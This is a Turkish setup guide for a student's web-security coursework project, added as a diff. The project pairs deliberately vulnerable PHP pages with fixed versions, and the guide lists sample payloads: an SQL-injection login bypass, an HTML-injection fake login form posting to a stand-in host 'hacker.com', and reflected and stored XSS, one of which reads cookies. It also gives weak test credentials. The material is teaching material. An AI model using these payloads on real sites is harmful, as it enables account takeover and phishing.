@@ -1,0 +1,100 @@
+========================================================================
+  WEB GÜVENLİĞİ VE GÜVENLİ KODLAMA PROJESİ — KURULUM REHBERİ
+  Zafer BÜYÜKYAVUZ  |  Öğrenci No: 240525001
+  Adli Bilişim Mühendisliği 2. Sınıf
+========================================================================
+
+Bu proje PHP + MySQL (MySQLi) ile geliştirilmiştir. Çalıştırmak için
+XAMPP, MAMP veya WAMP gibi bir yerel sunucu yazılımı yeterlidir.
+
+------------------------------------------------------------------------
+1) KURULUM ADIMLARI
+------------------------------------------------------------------------
+
+ADIM 1 — Dosyaları yerleştirin
+  • XAMPP kullanıyorsanız: bu klasördeki TÜM dosyaları
+        C:\xampp\htdocs\web_proje\
+    klasörünün içine kopyalayın.
+  • MAMP (Mac) kullanıyorsanız:
+        /Applications/MAMP/htdocs/web_proje/
+    klasörünün içine kopyalayın.
+
+ADIM 2 — Apache ve MySQL servislerini başlatın
+  • XAMPP/MAMP kontrol panelinden "Apache" ve "MySQL" servislerini
+    "Start" ile çalıştırın.
+
+ADIM 3 — Veritabanını oluşturun (web_proje.sql)
+  • Tarayıcıdan phpMyAdmin'i açın:  http://localhost/phpmyadmin
+  • Üst menüden "İçe Aktar" (Import) sekmesine tıklayın.
+  • "Dosya Seç" diyerek bu klasördeki  web_proje.sql  dosyasını seçin.
+  • "Git" / "Çalıştır" (Go) butonuna basın.
+  • Not: SQL dosyası "web_proje" veritabanını otomatik oluşturur,
+    "kullanicilar" ve "mesajlar" tablolarını kurar ve örnek verileri ekler.
+
+ADIM 4 — Projeyi açın
+  • Tarayıcıdan şu adrese gidin:
+        http://localhost/site/login.php
+
+------------------------------------------------------------------------
+2) VERİTABANI BAĞLANTI BİLGİLERİ
+------------------------------------------------------------------------
+
+PHP dosyalarındaki bağlantı satırı şu şekildedir:
+
+    $conn = new mysqli("localhost", "root", "root", "web_proje");
+
+  • Sunucu     : localhost
+  • Kullanıcı  : root
+  • Parola     : root          <-- ÖNEMLİ
+  • Veritabanı : web_proje
+
+** DİKKAT: ** XAMPP'ta MySQL parolası genellikle BOŞTUR.
+Eğer "Access denied for user 'root'" hatası alırsanız, tüm .php
+dosyalarındaki bağlantı satırını şu şekilde değiştirin (parolayı boş yapın):
+
+    $conn = new mysqli("localhost", "root", "", "web_proje");
+
+(MAMP kullanıcısıysanız parola "root" olarak kalmalıdır.)
+
+------------------------------------------------------------------------
+3) TEST KULLANICILARI (Giriş için)
+------------------------------------------------------------------------
+
+  Kullanıcı Adı : admin     Parola : admin
+  Kullanıcı Adı : zafer     Parola : zafer
+
+(Veya SQL Injection ile parola olmadan giriş yapılabilir — aşağıya bakın.)
+
+------------------------------------------------------------------------
+4) ZAFİYETLER, KONUMLARI VE ÖRNEK PAYLOAD'LAR
+------------------------------------------------------------------------
+
+[A] SQL INJECTION (2 adet) — login.php
+    Alan      : Kullanıcı Adı ve Parola input'ları
+    Payload   : Kullanıcı adına ->  admin' OR '1'='1
+                Parolaya        ->  (herhangi bir şey)
+    Sonuç     : Parola bilinmeden admin olarak giriş (Authentication Bypass).
+    Güvenli   : login_guvenli.php (Prepared Statement ile kapatılmış).
+
+[B] HTML INJECTION (1 adet) — zafiyetli.php > Modül 1 (Mesaj alanı)
+    Alan      : html_mesaj (textarea)
+    Payload   : <h1>Sistem Hatası!</h1><form action="http://hacker.com">
+                <input type="password" name="sifre">
+                <button>Şifreni Doğrula</button></form>
+    Sonuç     : Sayfaya sahte bir giriş formu (phishing) enjekte edilir.
+    Güvenli   : guvenli.php > Modül 1 (htmlspecialchars ile kapatılmış).
+
+[C] REFLECTED XSS (1 adet) — zafiyetli.php > Modül 2 (Arama)
+    Alan      : search (GET parametresi)
+    Payload   : <script>alert("Cookie: " + document.cookie);</script>
+    Sonuç     : URL'den yansıyan zararlı script tarayıcıda çalışır.
+    Güvenli   : guvenli.php > Modül 2 (htmlspecialchars + ENT_QUOTES).
+
+[D] STORED XSS (1 adet) — zafiyetli.php > Modül 3 (Ziyaretçi Defteri)
+    Alan      : yorum (POST -> veritabanına kalıcı kayıt)
+    Payload   : <script>document.body.style.backgroundColor='black';
+                alert('SİSTEM ELE GEÇİRİLDİ!');</script>
+    Sonuç     : Kod DB'ye kaydedilir; sayfayı açan herkeste çalışır.
+    Güvenli   : guvenli.php > Modül 3 (Prepared Statement + htmlspecialchars).
+
+Toplam: 1 HTML Injection + 2 XSS (Reflected + Stored) + 2 SQL Injection.
